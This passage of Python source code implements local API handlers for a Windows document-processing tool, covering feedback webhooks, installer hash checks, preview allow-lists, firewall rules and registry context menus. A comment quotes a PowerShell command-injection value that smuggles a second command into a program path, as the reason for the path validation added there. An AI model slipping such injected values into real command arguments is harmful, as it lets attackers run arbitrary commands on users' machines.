        所以这里把 get_enabled_prefixes() 的结果一并发出去，让界面照实显示。
        """
        try:
            effective = []
            source = "default"
            try:
                from utils.helpers import get_enabled_prefixes
                got = get_enabled_prefixes()
                if got:
                    effective = sorted(str(p) for p in got)
                    source = "configured"      # 确实按配置注入过
                # got 为空/None：未注入，或"全关→回退内置默认表"的护栏分支
            except Exception as pe:
                log_print(f"读取生效前缀失败: {pe}", "WARN")
            self._send_json({
                "groups": _effective_prefix_groups(),
                "effective": effective,
                "effectiveSource": source,     # configured | default
            })
        except Exception as e:
            log_print(f"读取内置前缀配置失败: {e}", "ERROR")
            self._send_json({"groups": {}, "effective": [], "effectiveSource": "default"})

    def handle_notify(self, data):
        """发送 Windows 原生系统通知"""
        title = data.get("title", "标准处理系统")
        body = data.get("body", "")
        # 通知（不使用图标，避免 win10toast 加载 png 崩溃）
        try:
            from win10toast import ToastNotifier
            n = ToastNotifier()
            # threaded=True 必须传：默认实现会在当前线程里 sleep(duration)，
            # 等于把这次 HTTP 请求挂住 5 秒。几条"处理完成"通知就能把请求线程占满，
            # 期间 /api/progress 轮询排队 → 界面看起来卡住。
            n.show_toast(title, body, duration=5, threaded=True)
            self._send_json({"success": True})
        except Exception:
            self._send_json({"success": False, "error": "通知发送失败"})

    def handle_feedback(self, data):
        """接收用户反馈并通过钉钉 Webhook 转发（涉密模式下自动禁用）"""
        content = data.get("content", "").strip()
        contact = data.get("contact", "").strip()
        if not content:
            self._send_json({"success": False, "error": "反馈内容不能为空"})
            return

        # 涉密模式自动禁用反馈通道
        if not allow_feedback_webhook():
            log_print("涉密模式下禁用反馈发送", "WARN")
            self._send_json({"success": False, "error": "涉密模式下已禁用外部反馈通道"})
            return

        # 反馈通道未配置（例如从公开源码自行构建的副本）：
        # 不发送任何数据，引导用户改用邮箱。
        if not has_feedback_config():
            log_print("反馈通道未配置，已引导用户改用邮箱反馈", "WARN")
            self._send_json({
                "success": False,
                "channel_unavailable": True,
                "fallback_email": FEEDBACK_FALLBACK_EMAIL,
                "error": ("通过 GitHub 获取的程序暂时不支持本方式反馈，"
                          "请使用邮箱反馈：" + FEEDBACK_FALLBACK_EMAIL),
            })
            return

        try:
            # 凭据来源：环境变量 > 构建期注入的私有模块 _feedback_private.py
            webhook_url, secret = get_feedback_credentials()
            if not webhook_url or not secret:
                self._send_json({
                    "success": False,
                    "channel_unavailable": True,
                    "fallback_email": FEEDBACK_FALLBACK_EMAIL,
                    "error": ("反馈通道当前不可用，请使用邮箱反馈："
                              + FEEDBACK_FALLBACK_EMAIL),
                })
                return

            import requests as _req
            import hmac as _hmac
            import hashlib as _hl
            import base64 as _b64
            import urllib.parse as _up
            # 钉钉签名
            timestamp = str(round(time.time() * 1000))
            sign_str = timestamp + "\n" + secret
            signature = _b64.b64encode(
                _hmac.new(secret.encode(), sign_str.encode(), _hl.sha256).digest()
            ).decode()
            webhook_url = webhook_url + f"&timestamp={timestamp}&sign={_up.quote(signature)}"
            payload = {
                "msgtype": "markdown",
                "markdown": {
                    "title": "标准处理系统 用户反馈",
                    "text": f"### 📮 标准处理系统 用户反馈\n\n**反馈内容**：{content}\n\n**联系方式**：{contact or '未填写'}\n\n**时间**：{time.strftime('%Y-%m-%d %H:%M:%S')}",
                },
            }
            resp = _req.post(webhook_url, json=payload, timeout=10)
            if resp.status_code == 200:
                result = resp.json()
                if result.get("errcode") == 0:
                    log_print("反馈已发送至钉钉", "INFO")
                    self._send_json({"success": True})
                else:
                    self._send_json({"success": False, "error": result.get("errmsg", "未知错误")})
            else:
                self._send_json({"success": False, "error": f"发送失败: {resp.status_code}"})
        except Exception as e:
            log_print(f"反馈发送失败: {e}", "ERROR")
            self._send_json({"success": False, "error": str(e)})

    def handle_install_ocr(self):
        """运行 Tesseract OCR 安装程序（设置页「安装 OCR 引擎」）。

        安全（H1 第二处提权执行点）：此前直接 `os.startfile(写死的文件名)` ——
        既绕开了安装程序刚建立的哈希白名单（丢一个同名假 exe 就能借本程序提权），
        又把版本号写死（Tesseract 升级后必然"安装程序未找到"）。
        现在与安装程序**共用** utils/ocr_verify：通配定位 + 内容哈希校验，
        校验不过一律 fail-closed 并如实返回原因（不再只报"装不上"）。
        """
        try:
            import utils.ocr_verify as _ocr
        except Exception as e:
            log_print(f"[安全] OCR 校验模块不可用，已拒绝启动: {e}", "ERROR")
            self._send_json({"success": False, "error": f"OCR 校验模块不可用，已拒绝启动：{e}"})
            return
        try:
            search_dirs = [_root_dir(), os.path.join(_root_dir(), "_internal")]
            mei = getattr(sys, "_MEIPASS", None)
            if mei:
                search_dirs.insert(0, mei)
            installer = _ocr.find_ocr_installer(search_dirs)
            if not installer:
                log_print("未找到 OCR 安装包（tesseract-ocr-*.exe）", "WARN")
                self._send_json({"success": False, "error": "安装程序未找到"})
                return
            ok, why = _ocr.verify_ocr_installer(installer)
            if not ok:
                log_print(f"[安全] 已阻止运行未通过校验的 OCR 安装包: {installer}", "WARN")
                log_print(f"[安全] {why}", "WARN")
                self._send_json({"success": False, "error": (
                    f"{why}\n\n请从官方渠道重新获取 OCR 安装包，"
                    f"或运行「标准处理系统安装程序」在本机完成安装。")})
                return
            log_print(f"正在启动 Tesseract OCR 安装程序（完整性校验通过 {why}）...", "INFO")
            # 用 os.startfile 而不是 Popen(shell=True)：
            # shell=True 会先起一个 cmd.exe，在 console=False 的程序里必然闪出黑色窗口；
            # startfile 走 ShellExecute，直接交给系统启动（安装包的 UAC 由它自己的清单负责）
            os.startfile(installer)   # noqa: S606 - 路径经查询+哈希校验，非用户输入
            self._send_json({"success": True, "message": "安装程序已启动"})
        except Exception as e:
            log_print(f"启动安装程序失败: {e}", "ERROR")
            self._send_json({"success": False, "error": str(e)})

    def handle_select_files(self, data):
        """处理文件选择请求，返回文件路径和页数"""
        import tkinter as tk
        from tkinter import filedialog
        
        root = tk.Tk()
        root.withdraw()
        paths = filedialog.askopenfilenames(
            title="选择文件",
            filetypes=[
                ("所有支持的文档",
                 "*.docx *.doc *.pdf *.xlsx *.xls *.pptx *.txt *.csv *.md *.rtf"),
                ("Word 文档", "*.docx *.doc"),
                ("PDF 文件", "*.pdf"),
                ("Excel 表格", "*.xlsx *.xls"),
                ("PowerPoint 演示文稿", "*.pptx"),
                ("文本文件", "*.txt *.csv *.md *.log *.rtf"),
                ("所有文件", "*.*")
            ]
        )
        root.destroy()
        
        result = []
        for p in paths:
            # 惰性页数：不在请求线程里解析文件（见 /api/page_counts）
            result.append({"path": p, "name": os.path.basename(p), "pages": 0})

        self._send_json({"files": result})

    def handle_select_folder(self, data):
        """处理文件夹选择请求，返回目录树和文件列表"""
        import tkinter as tk
        from tkinter import filedialog
        
        root = tk.Tk()
        root.withdraw()
        folder = filedialog.askdirectory(title="选择文件夹")
        root.destroy()
        
        if not folder:
            self._send_json({"files": [], "tree": None})
            return
        
        log_print(f"选择文件夹: {folder}", "INFO")
        
        def build_tree(path):
            name = os.path.basename(path) or path
            node = {"name": name, "type": "folder", "path": path, "items": []}
            try:
                for item in sorted(os.listdir(path)):
                    item_path = os.path.join(path, item)
                    if os.path.isdir(item_path):
                        node["items"].append(build_tree(item_path))
                    elif item.lower().endswith(_SUPPORTED_EXTS):
                        node["items"].append({"name": item, "type": "file", "path": item_path})
            except PermissionError:
                pass
            return node
        
        tree = build_tree(folder)
        
        all_files = []
        def collect_files(node):
            if node.get("type") == "file":
                # 惰性页数：这里**不再打开文件**统计。原实现逐个解析（PDF/Excel/docx
                # 都要真读一遍），且本函数对整棵目录树递归 → 大文件夹界面转圈数分钟、
                # 无进度也不能取消。页数先给 0（界面显示"统计中…"），
                # 由前端调 /api/page_counts 并行补回。
                all_files.append({"path": node["path"], "name": node["name"], "pages": 0})
            for child in node.get("items", []):
                collect_files(child)
        
        collect_files(tree)
        log_print(f"文件夹扫描完成：{len(all_files)} 个文档文件", "INFO")
        self._send_json({"files": all_files, "tree": tree})

    def handle_preview(self, data):
        """处理文件预览请求"""
        file_path = data.get("file", "")
        if not file_path or not os.path.exists(file_path):
            self._send_json({"error": "文件不存在", "text": ""}, 400)
            return
        # 安全（H4）：预览会返回文件正文，必须与 /api/file 用同一套授权白名单，
        # 否则任意网页可借本地 API 读取任意文档（C1/C5 的利用链就是这条路）
        if not is_preview_allowed(file_path):
            log_print(f"[安全] 拒绝预览未授权文件: {sanitize_log(file_path)}", "WARN")
            self._send_json({"error": "该文件未通过授权校验，请从程序的文件列表中重新选择",
                             "text": ""}, 403)
            return

        log_print(f"加载预览: {sanitize_log('[文件预览]' if is_classified() else file_path)}", "INFO")
        try:
            service = PreviewService()
            preview = service.load_raw_preview(file_path)
            if preview.get("error"):
                # 预览失败要如实返回错误，而不是让前端把错误文案当正文渲染成"成功"
                self._send_json({"error": preview["error"], "text": ""}, 500)
                return
            self._send_json({
                "html": preview.get("html", ""),
                "text": preview.get("text", "")
            })
        except Exception as e:
            import traceback
            log_print(f"预览加载失败: {e}\n{traceback.format_exc()}", "ERROR")
            self._send_json({"error": f"预览加载失败：{e}", "text": ""}, 500)

    def handle_preview_process(self, data):
        """同步解析单个文件并返回文本（预览面板「解析预览」按钮专用）。

        与异步的 /api/process 的区别：这里在**当前请求内**解析完并把文本返回，
        不启动后台任务、不占用任务锁、不污染 progress_state。
        原先前端误用 /api/process：响应里根本没有 text 字段，界面却恒显示
        "解析完成"（假成功）；更糟的是那次调用真的启动了一个后台处理任务
        占住任务锁，用户之后点「处理」会莫名收到"已有任务正在处理中"。
        """
        file_path = (data.get("file") or "").strip()
        if not file_path or not os.path.exists(file_path):
            self._send_json({"error": "文件不存在", "text": ""}, 400)
            return
        # 安全（H4）：同上，解析预览同样会吐正文，必须走白名单
        if not is_preview_allowed(file_path):
            log_print(f"[安全] 拒绝解析预览未授权文件: {sanitize_log(file_path)}", "WARN")
            self._send_json({"error": "该文件未通过授权校验，请从程序的文件列表中重新选择"}, 403)
            return
        if _process_lock.locked():
            self._send_json({"error": "正在处理文件，请等处理完成后再用「解析预览」"}, 409)
            return
        log_print(f"解析预览（同步）: {sanitize_log(file_path)}", "INFO")
        try:
            from core.preview_service import PreviewService
            service = PreviewService()
            result = service.process_preview(file_path, {
                "start_page": data.get("start_page", 1),
                "end_page": data.get("end_page", 9999),
                "extract_table": data.get("extract_table", True),
                "extract_body": data.get("extract_body", True),
                "extract_image": data.get("extract_image", True),
                "extract_textbox": data.get("extract_textbox", True),
                # 预览不做 AI 增强（逐行联网），也不对图片做 OCR，避免按钮转很久
                "ai_enhance": False,
                "ocr_images": False,
            })
            self._send_json({
                "text": result.get("text", ""),
                "tables": result.get("tables", []),
                "stats": result.get("stats", {}),
            })
        except Exception as e:
            import traceback
            log_print(f"解析预览失败: {e}\n{traceback.format_exc()}", "ERROR")
            self._send_json({"error": f"解析预览失败：{e}", "text": ""}, 500)

    def handle_lookup_standard(self, data):
        """联网查询标准名称（涉密模式下拒绝）"""
        # 涉密模式禁止联网查询
        if not allow_network_lookup():
            log_print("[涉密模式] 拒绝联网查标准请求", "WARN")
            self._send_json({"error": "涉密模式下已禁用联网查标准功能"})
            return

        standards = data.get("standards", [])
        if not standards:
            self._send_json({"error": "请提供标准编号列表"}, 400)
            return

        log_print(f"联网查询标准名称: {len(standards)} 条", "INFO")
        strip_year = bool(data.get("strip_year", False))
        try:
            # 单条查询
            if isinstance(standards, str):
                result = online_lookup_standard(standards, strip_year=strip_year)
                if result and "《" in result:
                    from utils.helpers import add_standard_to_review
                    add_standard_to_review(result)
                self._send_json({"results": {standards: result}})
                return

            # 批量查询
            if not isinstance(standards, list):
                self._send_json({"error": "standards 必须是字符串或列表"}, 400)
                return

            # 限制批量大小
            if len(standards) > 50:
                log_print(f"批量查询数量超过限制: {len(standards)}，截断到50条", "WARN")
                standards = standards[:50]

            results = batch_online_lookup(standards, strip_year=strip_year)
            # 查询成功的写入待审核文件
            from utils.helpers import add_standard_to_review
            for std, display in results.items():
                if display and "《" in display:
                    add_standard_to_review(display)
            found_count = sum(1 for v in results.values() if v)
            log_print(f"联网查询完成: {found_count}/{len(standards)} 找到", "INFO")
            self._send_json({"results": results})
        except Exception as e:
            import traceback
            err = traceback.format_exc()
            log_print(f"联网查询失败: {e}", "ERROR")
            log_print(err, "ERROR")
            self._send_json({"error": str(e), "results": {}}, 500)

    def handle_add_to_dict(self, data):
        """将确认的标准名称写入主库"""
        display_name = data.get("name", "")
        if not display_name:
            self._send_json({"success": False, "error": "缺少名称"}, 400)
            return
        success = add_standard_to_main(display_name)
        if success:
            log_print(f"已写入主库: {display_name}", "INFO")
            self._send_json({"success": True})
        else:
            self._send_json({"success": False, "error": "写入失败或已存在"})

    def handle_firewall_manage(self):
        """返回所有可管理的进程及其规则状态"""
        from core.security_config import (
            list_manageable_processes, get_managed_programs_info,
            _check_admin, _firewall_info,
        )
        try:
            processes = list_manageable_processes()
            self._send_json({
                "admin_available": _check_admin(),
                "processes": processes,
                "managed": get_managed_programs_info(),
                "firewall_info": _firewall_info(),
            })
        except Exception as e:
            log_print(f"查询防火墙管理列表失败: {e}", "ERROR")
            self._send_json({"error": str(e), "processes": []}, 500)

    def handle_firewall_block(self, data=None):
        """手动阻止指定程序联网"""
        from core.security_config import block_program, _check_admin
        try:
            data = data or {}
            program = data.get("program") or data.get("path")
            note = data.get("note", "")
            if not program:
                self._send_json({"success": False, "error": "缺少程序路径"}, 400)
                return
            # 安全：program 会被拼进 PowerShell 脚本，必须在 API 边界就校验。
            # 原实现直接透传，`C:\x\a.exe"; Write-Host INJECTED; #` 可逃逸出引号
            # 执行任意命令（审计已动态验证；且不要求文件存在）。
            from core.security_config import _is_safe_program_path as _safe
            if not _safe(program):
                log_print(f"[安全] 拒绝可疑的 firewall/block 程序路径: {sanitize_log(program)}", "WARN")
                self._send_json({"success": False, "error": "程序路径不合法（必须是本机存在的文件）"}, 400)
                return
            if not _check_admin():
                self._send_json({"success": False, "error": "需要管理员权限，请先通过涉密模式提权"}, 403)
                return
            ok = block_program(program, note)
            self._send_json({"success": ok})
        except Exception as e:
            log_print(f"阻止程序失败: {e}", "ERROR")
            self._send_json({"success": False, "error": str(e)}, 500)

    def handle_firewall_allow(self, data=None):
        """手动放行指定程序联网"""
        from core.security_config import allow_program
        try:
            data = data or {}
            program = data.get("program") or data.get("path")
            if not program:
                self._send_json({"success": False, "error": "缺少程序路径"}, 400)
                return
            ok = allow_program(program)
            self._send_json({"success": ok})
        except Exception as e:
            log_print(f"放行程序失败: {e}", "ERROR")
            self._send_json({"success": False, "error": str(e)}, 500)

    def handle_check_pending_import(self):
        """读取由 CLI 参数（右键菜单）传入的待导入路径"""
        import json as _json
        pending_path = _user_data(".pending_import.json")
        if not os.path.exists(pending_path):
            self._send_json({})
            return
        try:
            with open(pending_path, 'r', encoding='utf-8') as f:
                data = _json.load(f)
            # 读取后立即删除，避免重复导入
            os.remove(pending_path)
            log_print(f"读取挂起导入: {len(data.get('files',[]))} 个文件, {len(data.get('folders',[]))} 个文件夹", "INFO")
            self._send_json(data)
        except Exception as e:
            log_print(f"读取挂起导入失败: {e}", "WARN")
            try:
                os.remove(pending_path)
            except Exception:
                pass
            self._send_json({})

    def handle_import_files(self, data):
        """直接通过路径列表导入文件（不弹出对话框）"""
        paths = data.get("paths", [])
        # 复审批 2-2（纵深防御）：限量 —— 本接口返回的路径会被 _send_json 自动
        # 登记进预览白名单，限量可避免它被当作"批量枚举本机文档"的工具。
        if isinstance(paths, list) and len(paths) > _IMPORT_PATH_MAX:
            log_print(f"[安全] import_files 路径数超限（{len(paths)}），"
                      f"已截断为 {_IMPORT_PATH_MAX}", "WARN")
            paths = paths[:_IMPORT_PATH_MAX]
        if not paths:
            self._send_json({"files": []})
            return
        result = []
        for p in paths:
            if not os.path.isfile(p):
                continue
            if not p.lower().endswith(_SUPPORTED_EXTS):
                continue
            # 惰性页数：不在请求线程里解析文件（见 /api/page_counts）
            result.append({"path": p, "name": os.path.basename(p), "pages": 0})
        log_print(f"导入文件（直接）: {len(result)} 个", "INFO")
        # 2-2：这些路径会被 _send_json 自动登记进预览白名单（之后可读正文），
        # 原来完全静默 —— 至少留下审计痕迹
        if result:
            log_print(f"[安全] import_files 登记 {len(result)} 个文件为可预览，"
                      f"首个: {sanitize_log(result[0]['path'])}", "WARN")
        self._send_json({"files": result})

    def handle_import_folder(self, data):
        """直接通过路径导入文件夹（不弹出对话框）。

        复审批 2-2：本接口会**递归枚举任意目录树**并把文件名返回给调用方，
        同时把其中的文件登记进预览白名单。这里加审计日志（原来完全静默），
        让"谁枚举了哪个目录"有痕可查；不做路径限制以免破坏右键菜单/拖拽流程。
        """
        folder = data.get("path", "")
        if not folder or not os.path.isdir(folder):
            self._send_json({"files": [], "tree": None})
            return

        log_print(f"导入文件夹（直接）: {folder}", "INFO")
        log_print(f"[安全] import_folder 开始递归枚举目录: {sanitize_log(str(folder))}", "WARN")

        def build_tree(path):
            name = os.path.basename(path) or path
            node = {"name": name, "type": "folder", "path": path, "items": []}
            try:
                for item in sorted(os.listdir(path)):
                    item_path = os.path.join(path, item)
                    if os.path.isdir(item_path):
                        node["items"].append(build_tree(item_path))
                    elif item.lower().endswith(_SUPPORTED_EXTS):
                        node["items"].append({"name": item, "type": "file", "path": item_path})
            except PermissionError:
                pass
            return node

        tree = build_tree(folder)

        all_files = []
        def collect_files(node):
            if node.get("type") == "file":
                # 惰性页数：这里**不再打开文件**统计。原实现逐个解析（PDF/Excel/docx
                # 都要真读一遍），且本函数对整棵目录树递归 → 大文件夹界面转圈数分钟、
                # 无进度也不能取消。页数先给 0（界面显示"统计中…"），
                # 由前端调 /api/page_counts 并行补回。
                all_files.append({"path": node["path"], "name": node["name"], "pages": 0})
            for child in node.get("items", []):
                collect_files(child)

        collect_files(tree)
        log_print(f"文件夹扫描完成（直接）: {len(all_files)} 个文档文件", "INFO")
        self._send_json({"files": all_files, "tree": tree})

    def handle_install_context_menu(self, data):
        """安装 Windows 右键菜单（注册表）"""
        try:
            import subprocess
            # 获取当前可执行文件路径
            if hasattr(sys, '_MEIPASS'):
                exe_path = os.path.join(os.path.dirname(sys.executable), '标准处理系统.exe')
                icon_path = exe_path  # .exe 自带图标
            else:
                exe_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'main_browser.py')
                exe_path = os.path.abspath(exe_path)
                # 如果 pythonw 可用，用 pythonw 避免弹控制台
                python_exe = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
                if os.path.exists(python_exe):
                    exe_path = f'"{python_exe}" "{exe_path}"'
                else:
                    exe_path = f'"{sys.executable}" "{exe_path}"'
                # 开发模式：使用 logo.ico 作为图标
                icon_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'logo.ico')
                icon_path = os.path.abspath(icon_path)
                if not os.path.exists(icon_path):
                    icon_path = ''

            script = f'''
$exe = '{exe_path}'
$icon = '{icon_path}'

# 注册各扩展名的右键菜单（统一循环：以后新增格式只改这一行）
$exts = @(".pdf", ".doc", ".docx", ".docm", ".xls", ".xlsx", ".xlsm",
          ".ppt", ".pptx", ".pptm", ".txt", ".csv", ".md", ".log", ".rtf")
foreach ($e in $exts) {{
    $k = "HKCU:\\Software\\Classes\\SystemFileAssociations\\$e\\shell\\标准处理系统"
    if (-not (Test-Path $k)) {{ New-Item -Path $k -Force | Out-Null }}
    Set-ItemProperty -Path $k -Name "MUIVerb" -Value "使用标准处理系统处理"
    Set-ItemProperty -Path $k -Name "Icon" -Value $icon
    $c = "$k\\command"
    if (-not (Test-Path $c)) {{ New-Item -Path $c -Force | Out-Null }}
    Set-ItemProperty -Path $c -Name "(default)" -Value "`"$exe`" `"%1`""
}}

# 注册文件夹右键菜单
$folderPath = "HKCU:\\Software\\Classes\\Folder\\shell\\标准处理系统"
if (-not (Test-Path $folderPath)) {{ New-Item -Path $folderPath -Force | Out-Null }}
Set-ItemProperty -Path $folderPath -Name "MUIVerb" -Value "使用标准处理系统处理此文件夹"
Set-ItemProperty -Path $folderPath -Name "Icon" -Value $icon
$folderCmdPath = "$folderPath\\command"
if (-not (Test-Path $folderCmdPath)) {{ New-Item -Path $folderCmdPath -Force | Out-Null }}
Set-ItemProperty -Path $folderCmdPath -Name "(default)" -Value "`"$exe`" `"%1`""

# 注册文件夹背景右键菜单
$bgPath = "HKCU:\\Software\\Classes\\Directory\\Background\\shell\\标准处理系统"
if (-not (Test-Path $bgPath)) {{ New-Item -Path $bgPath -Force | Out-Null }}
Set-ItemProperty -Path $bgPath -Name "MUIVerb" -Value "使用标准处理系统打开此位置"
Set-ItemProperty -Path $bgPath -Name "Icon" -Value $icon
$bgCmdPath = "$bgPath\\command"
if (-not (Test-Path $bgCmdPath)) {{ New-Item -Path $bgCmdPath -Force | Out-Null }}
Set-ItemProperty -Path $bgCmdPath -Name "(default)" -Value "`"$exe`" `"%V`""

Write-Host "右键菜单安装完成"
'''
            temp_ps1 = os.path.join(tempfile.gettempdir(), 'install_cm_std.ps1')
            # 使用 utf-8-sig（带 BOM），PowerShell 才能正确识别 UTF-8 中的中文
            with open(temp_ps1, 'w', encoding='utf-8-sig') as f:
                f.write(script)
            # 使用二进制模式捕获输出，避免 GBK 解码崩溃
            result = subprocess.run(
                ['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', temp_ps1],
                capture_output=True, timeout=30,
                **hidden_proc_kwargs(),
            )
            try:
                os.remove(temp_ps1)
            except Exception:
                pass
            # 安全解码 stderr（可能含中文，用 GBK 解码并忽略错误）
            stderr_text = result.stderr.decode('gbk', errors='replace') if result.stderr else ''
            stdout_text = result.stdout.decode('gbk', errors='replace') if result.stdout else ''
            if result.returncode == 0:
                log_print(f"右键菜单安装成功: {stdout_text.strip()}", "INFO")
                self._send_json({"success": True, "message": "右键菜单已安装，可能需要刷新文件资源管理器生效"})
            else:
                err_msg = stderr_text.strip() or "安装失败"
                log_print(f"右键菜单安装失败: {err_msg}", "WARN")
                self._send_json({"success": False, "error": err_msg})
        except Exception as e:
            log_print(f"右键菜单安装异常: {e}", "ERROR")
            self._send_json({"success": False, "error": str(e)})

    def handle_uninstall_context_menu(self, data):
        """卸载 Windows 右键菜单（注册表）"""
        try:
            import subprocess
            script = '''
# 删除各扩展名的右键菜单（与注册保持一致）
$exts = @(".pdf", ".doc", ".docx", ".docm", ".xls", ".xlsx", ".xlsm",
          ".ppt", ".pptx", ".pptm", ".txt", ".csv", ".md", ".log", ".rtf")
foreach ($e in $exts) {
    $p = "HKCU:\\Software\\Classes\\SystemFileAssociations\\$e\\shell\\标准处理系统"
    if (Test-Path $p) { Remove-Item -Path $p -Recurse -Force }
}

# 删除文件夹右键菜单
$p = "HKCU:\\Software\\Classes\\Folder\\shell\\标准处理系统"
if (Test-Path $p) { Remove-Item -Path $p -Recurse -Force }

# 删除文件夹背景右键菜单
$p = "HKCU:\\Software\\Classes\\Directory\\Background\\shell\\标准处理系统"
if (Test-Path $p) { Remove-Item -Path $p -Recurse -Force }

Write-Host "右键菜单卸载完成"
'''
            temp_ps1 = os.path.join(tempfile.gettempdir(), 'uninstall_cm_std.ps1')
            # 使用 utf-8-sig（带 BOM），PowerShell 才能正确识别 UTF-8 中的中文
            with open(temp_ps1, 'w', encoding='utf-8-sig') as f:
                f.write(script)
            result = subprocess.run(
                ['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', temp_ps1],
                capture_output=True, timeout=30,
                **hidden_proc_kwargs(),
            )
            try:
                os.remove(temp_ps1)
            except Exception:
                pass
            stderr_text = result.stderr.decode('gbk', errors='replace') if result.stderr else ''
            stdout_text = result.stdout.decode('gbk', errors='replace') if result.stdout else ''
            if result.returncode == 0:
                log_print(f"右键菜单卸载成功: {stdout_text.strip()}", "INFO")
                self._send_json({"success": True, "message": "右键菜单已卸载"})
            else:
                err_msg = stderr_text.strip() or "卸载失败"
                log_print(f"右键菜单卸载失败: {err_msg}", "WARN")
                self._send_json({"success": False, "error": err_msg})
        except Exception as e:
            log_print(f"右键菜单卸载异常: {e}", "ERROR")
            self._send_json({"success": False, "error": str(e)})

    def handle_cancel(self, data):
        """取消正在进行的处理任务"""
        global cancel_flag
        cancel_flag = True
        log_print("收到取消请求，正在终止处理...", "WARN")
        self._send_json({"success": True, "message": "已请求终止处理"})

    def handle_process(self, data):
        """处理文档处理请求 - 在后台线程中执行，立即返回"""
        global progress_state, _task_generation
        log_print("=" * 60, "START")
        log_print("收到 /api/process 请求", "HTTP")
        # 涉密模式下不要打印详细任务参数（可能含文件路径）
        if is_classified():
            log_print(f"任务: {len(data.get('files', []))} 个文件, 涉密模式", "INFO")
        else:
            log_print(f"任务参数: {json.dumps(data, ensure_ascii=False)[:500]}", "INFO")

        # 自动检测最优线程数（前端传 0 时自动计算）
        frontend_val = data.get("max_workers", 0)
        if frontend_val and frontend_val > 0:
            max_workers = frontend_val
        else:
            max_workers = _auto_detect_workers(
                file_count=len(data.get("files", [])),
                ocr_enabled=data.get("ocr_scanned", True),
            )
        task = {
            "files": data.get("files", []),
            "start_page": data.get("start_page", 1),
            "end_page": data.get("end_page", 9999),
            "extract_table": data.get("extract_table", True),
            "extract_body": data.get("extract_body", True),
            "extract_image": data.get("extract_image", True),
            "extract_textbox": data.get("extract_textbox", True),
            "ocr_scanned": data.get("ocr_scanned", True),
            "ai_enhance": data.get("ai_enhance", True),
            "ocr_images": data.get("ocr_images", True),
            "max_workers": max_workers,
            "auto_lookup": data.get("auto_lookup", True),
            "file_options": data.get("file_options", {}),
            "file_page_options": data.get("file_page_options", {}),
            "process_mode": data.get("process_mode", "extract"),
            "update_existing": bool(data.get("update_existing", False)),
            # 必须原样带上：后台自动联网补名会读它（server.py 的
            # batch_online_lookup(..., strip_year=task.get("strip_year", False))）。
            # 早先漏了这一行，导致"忽略年代号"设置对自动补名完全无效，
            # 而前端完成提示里还写着"已忽略年代号"。
            "strip_year": bool(data.get("strip_year", False)),
        }
        # 安全（H4）：/api/process 的结果里带文件正文，必须与预览同一套白名单，
        # 否则任意网页可 POST 一个本机文档路径把内容读走（C1/C5 的利用链）
        _task_files = task.get("files") or []
        _bad = [p for p in _task_files if p and not is_preview_allowed(p)]
        if _bad:
            log_print(f"[安全] 拒绝处理未授权文件: {sanitize_log(_bad[0])}", "WARN")
            self._send_json({"started": False,
                             "error": "文件未通过授权校验（"
                                      + os.path.basename(_bad[0]) +
                                      "），请从程序的文件列表中重新选择后再处理"})
            return
        # 登记本次任务的文件，便于处理期间/之后仍能用 PDF.js 预览
        allow_preview(_task_files)
        log_print(f"CPU={os.cpu_count()}核, 文件={len(data.get('files',[]))}个, 线程={max_workers}, OCR={data.get('ocr_scanned', True)}", "INFO")

        # 检查是否已有处理任务在运行
        if not _process_lock.acquire(blocking=False):
            log_print("已有处理任务正在运行，拒绝新的处理请求", "WARN")
            self._send_json({"started": False, "error": "已有任务正在处理中，请等待完成或先终止"})
            return

        # 立刻把任务代际 +1（run_process 里还会再加一次）：这样上一个任务遗留的
        # 联网补名线程从这一刻起就不再被认作"当前任务"，不会把旧结果写进新任务。
        _task_generation += 1
        progress_state = {"value": 0, "status": "准备处理", "logs": [], "done": False, "result": None}
        try:
            thread = threading.Thread(target=_run_process_wrapper, args=(task,), daemon=True)
            thread.start()
        except Exception as e:
            # 线程都起不来时必须把锁还回去，否则之后所有请求都会一直提示
            # "已有任务正在处理中"，只能重启程序
            log_print(f"启动处理线程失败: {e}", "ERROR")
            try:
                _process_lock.release()
            except RuntimeError:
                pass
            self._send_json({"started": False, "error": f"无法启动处理任务：{e}"})
            return
        self._send_json({"started": True, "message": "任务已启动"})


class _JobContext:
    """把 handle_export 里的 self._send_json 重定向成"写入任务结果"，
    并让 self._progress / self._cancelled 作用到真实任务状态上。
    这样导出逻辑只需维护一份，同步/异步两种模式共用。"""

    def __init__(self, job):
        self.job = job
        self.payload = None
        self.status = 200

    def _send_json(self, data, status=200):
        self.payload = data
        self.status = status

    def _progress(self, value=None, status=None):
        job_update(self.job, value=value, status=status)

    def _cancelled(self):
        return bool(self.job.get("cancel"))


def _cleanup_export_file(file_id):
    """删除导出过程中留下的半成品文件（取消/失败时调用）"""
    if not file_id:
        return
    for ext in (".xlsx", ".json", ".csv"):
        p = os.path.join(EXPORT_DIR, file_id + ext)
        try:
            if os.path.exists(p):
                os.remove(p)
                log_print(f"已清理未完成的导出文件: {os.path.basename(p)}", "INFO")
        except Exception:
            pass


def _run_export_job(job, data):
    """后台线程：执行导出并汇报进度；结果与错误都写回任务状态"""
    ctx = _JobContext(job)
    data = dict(data)
    data["_file_id"] = str(uuid.uuid4())   # 便于取消/失败时清理半成品
    try:
        job_update(job, value=8, status="正在导出…")
        APIHandler.handle_export(ctx, data)
        payload = ctx.payload or {}
        if job.get("cancel"):
            # 取消是用户主动行为，优先于导出自身的异常分支（取消会抛 RuntimeError）
            _cleanup_export_file(data.get("_file_id"))
            job_update(job, done=True, error="已取消导出", status="已取消")
        elif payload.get("error"):
            _cleanup_export_file(data.get("_file_id"))
            job_update(job, done=True, error=str(payload["error"]), status="导出失败")
        else:
            job_update(job, value=100, status="导出完成", done=True, result=payload)
    except Exception as e:
        import traceback
        _cleanup_export_file(data.get("_file_id"))
        if job.get("cancel"):
            log_print("导出任务已被用户取消", "WARN")
            job_update(job, done=True, error="已取消导出", status="已取消")
            return
        log_print(f"导出任务失败: {e}\n{traceback.format_exc()}", "ERROR")
        job_update(job, done=True, error=f"导出失败：{e}", status="导出失败")


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    # Windows 下 SO_REUSEADDR 允许第二个进程绑定已被占用的端口（端口被"偷"走），
    # 会造成两个后端同时监听同一端口、请求随机落到其中一个（界面时好时坏）。
    # 这里明确关闭，改由 start_server() 探测已有实例并复用。
